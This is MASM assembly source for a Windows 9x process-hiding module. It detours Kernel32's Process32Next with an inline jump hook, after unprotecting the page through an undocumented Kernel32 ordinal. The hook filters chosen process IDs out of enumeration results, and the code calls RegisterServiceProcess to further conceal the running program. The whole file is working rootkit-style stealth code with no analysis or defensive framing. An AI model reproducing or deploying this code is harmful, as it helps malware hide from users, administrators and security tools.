.const

;----------------------------------- pushad structure from y0da
PUSHA_STRUCT STRUCT
	_EDI                            DWORD ?
	_ESI                            DWORD ?
	_EBP                            DWORD ?
	_ESP                            DWORD ?
	_EBX                            DWORD ?
	_EDX                            DWORD ?
	_ECX                            DWORD ?
	_EAX                            DWORD ?
PUSHA_STRUCT ENDS

;----------------------------------- inline memory copy macro from MASM
    mcopy MACRO lpSource,lpDest,len
        mov esi, lpSource
        mov edi, lpDest
        mov ecx, len
        rep movsb
    ENDM

;---------------------------------- Backdoor win9x values from y0da and Matt Pietrek
	_PageModifyPermissions                 EQU 00001000Dh
	PC_USER                                EQU 000040000h
	PC_STATIC                              EQU 020000000h
	PC_WRITEABLE	                       EQU 000020000h
	VA_SHARED                              EQU 08000000h
	
    szK32Dll            db "KERNEL32.dll",0
    szP32Next           db "Process32Next",0
    szRSP               db "RegisterServiceProcess",0
    
.data
;--------------------------------------- Win9xHide datas.
    hK32Mod             dd 0
    hRSP                dd 0
    Kernel32_Ord1       dd 0
    AllocAddr           dd 0
    myPID               dd 0
    AssJump		        db 0E9h,0,0,0,0
    
.code

    
include \masm32\modules\MyGetProcAddress.asm
;------------------------------------------ This is the main Hook Procedure, for Windows 9x hiding.
HookProcBegin:
    jmp @F
    RecPID                       dd 0
@@:
    pushad
	call @F
@@:
	pop ebp
	sub ebp, offset @B
	lea edi, [esp+sizeof PUSHA_STRUCT+4]            ; retrieves the arguments of the function via edi
	
		
	push [edi+4]                                    ; re-pushes them
	push [edi]
	lea eax, [ebp+offset RetAddr]                   ; push the desired return address
	push eax

    DeturnBegin db 15 dup(90h)

	
	mov eax, [ebp+hP32Next]
	jmp eax                                          ; jumps to the real func

Datas:
    hP32Next                    dd 0                ; pointer to the API+9 bytes
	PIDTable                    dd 0                ; pointer to the table containing PIDs to be hidden.
	PIDCount                    dd -1               ; number of PIDs at the moment in the table
	
RetAddr:
	mov edx, eax
  	mov esi, [edi+4]                                ; reloads the now full structure...
  	mov ebx, [esi].PROCESSENTRY32.th32ProcessID     ; reads the Process ID in it
;----------------------------------------------- Now we have to compare the read PID and the ones in the table.
    mov esi, [ebp+PIDTable]
    xor ecx, ecx
@@:
  	cmp ebx, dword ptr [esi+ecx*4]
  	jz HideThisPID
  	cmp ecx, dword ptr [ebp+PIDCount]
  	jz NotTheRightPID
  	inc ecx
  	jmp @B	
	
HideThisPID:	
    mov eax, [ebp+offset hP32Next]
    sub eax, 5
    mov [esp].PUSHA_STRUCT._EAX, eax
	popad
	jmp eax
	
NotTheRightPID:
    mov [esp].PUSHA_STRUCT._EAX, edx
    popad
	ret 8
HookProcEnd:                                                  

HideMe9x proc
;--------------------------------------------- finds the address of the target function.	
    invoke GetModuleHandle,addr szK32Dll
    mov hK32Mod, eax
    invoke MyGetProcAddress,hK32Mod,addr szRSP,0
    mov hRSP, eax
    invoke MyGetProcAddress,hK32Mod,addr szP32Next,0
    mov hP32Next, eax
    invoke GetCurrentProcessId
    mov myPID, eax
    mov RecPID, eax
    mov eax, hP32Next
    cmp byte ptr [eax], 0E9h               ; is the API yet hooked ?
    jnz NotYetHooked
    mov eax, hP32Next
    mov ebx, dword ptr [eax+1]
    add ebx, eax
    add ebx, 5
    add ebx, Datas-HookProcBegin
    mov edx, dword ptr [ebx+4]                  ; on récupère l'addresse de la table de PIDs dans la procedure de hook
    lea ebp, dword ptr [ebx+8]
    inc dword ptr [ebp]
    mov ecx, dword ptr [ebp]                  ; ainsi que le nombre de PIDs qui y sont présents au moment
    mov eax, myPID
    mov dword ptr [edx+ecx*4], eax
    jmp __endhookw9x
NotYetHooked:
;--------------------------------------------- allocate space for memory PID table & hook procedure
    invoke VirtualAlloc,0,4000h,MEM_COMMIT or VA_SHARED,PAGE_READWRITE
    mov PIDTable, eax
    invoke VirtualAlloc,0,HookProcEnd-HookProcBegin,MEM_COMMIT or VA_SHARED,PAGE_EXECUTE_READWRITE
    mov AllocAddr,eax
;-------------------------------------------- adds the current PID to the table
	inc PIDCount
	mov ecx,PIDCount
	mov eax, myPID
	mov edx, PIDTable
	mov dword ptr [edx+ecx*4], eax          ;

;-------------------------------------------- Calls the unprotect memory function
    mov edi, hP32Next
    shr edi, 12
    invoke MyGetProcAddress,hK32Mod,NULL,0
    mov Kernel32_Ord1, eax
    push PC_STATIC or PC_WRITEABLE or PC_USER
    push 0
    push 1
    push edi
    push _PageModifyPermissions
    call Kernel32_Ord1
        
;--------------------------------------------- creates a jump using the address of the hook proc, and the address of the hooked one.
    mov eax, AllocAddr
    sub eax, hP32Next
    sub eax, 5
    mov dword ptr [AssJump+1],eax 
    
    push offset tbl
    call disasm_init
    add esp, 4
    mov edx, hP32Next
    mov ebx, 4
@@:
    push edx
    push offset tbl
    call disasm_main
    add esp,8
    add edx, eax
    dec ebx
    jnz @B
    
    sub edx, hP32Next
    mcopy hP32Next,offset DeturnBegin,edx                                 ; copies some bytes to be saved : they will be overwritten by the  jump.
    
    add hP32Next, edx                                                     ; here P32Next is the address where we will jump inside of the hook.
    mcopy offset HookProcBegin,AllocAddr,HookProcEnd-HookProcBegin      ; now copies the Hook Procedure in the allocated space; we must be sure
                                                                        ; that all variables in the hook proc are ready.
    sub hP32Next, edx                                                     ; here P32Next is the address where we will jump inside of the hook.
    mcopy offset AssJump,hP32Next,sizeof AssJump                        ; and writes a jump at the entry point of the function.
    
__endhookw9x:
	push TRUE
	push myPID
	call hRSP                                   ; calls RegisterServiceProcess
	
    ret
HideMe9x endp

UnHideMe9x proc
    nop
    mov eax, AllocAddr
    add eax, DeturnBegin-HookProcBegin
    mcopy eax,hP32Next,sizeof AssJump
    invoke VirtualFree,AllocAddr,HookProcEnd-HookProcBegin,MEM_DECOMMIT
    invoke VirtualFree,PIDTable,4000h,MEM_DECOMMIT
    ret
UnHideMe9x endp
